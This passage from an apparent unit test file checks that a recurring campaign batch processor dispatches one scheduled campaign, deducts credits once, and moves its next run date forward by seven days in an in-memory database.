        VALUES ('sched_perfect', 'ws_test', 'usr_test_adv', 'Clean Campaign', '2026-09-19', 1);
      `);

      const res = await processRecurringCampaignBatch('2026-09-19');

      expect(res.processed).toBe(1);
      expect(res.dispatched).toBe(1);
      expect(res.skippedPreflight).toBe(0);
      expect(mocks.mockDeductCredits).toHaveBeenCalledTimes(1);
      expect(mocks.mockDispatchMultiTrackMission).toHaveBeenCalledTimes(1);

      // Verify CAS updated next_run_date to 7 days later
      const updated = inMemoryDb
        .prepare(`SELECT next_run_date, last_run_date FROM scheduled_campaigns WHERE id = 'sched_perfect'`)
        .get() as { next_run_date: string; last_run_date: string };

      expect(updated.last_run_date).toBe('2026-09-19');
      expect(updated.next_run_date).toBe('2026-09-26');
    });
  });
});
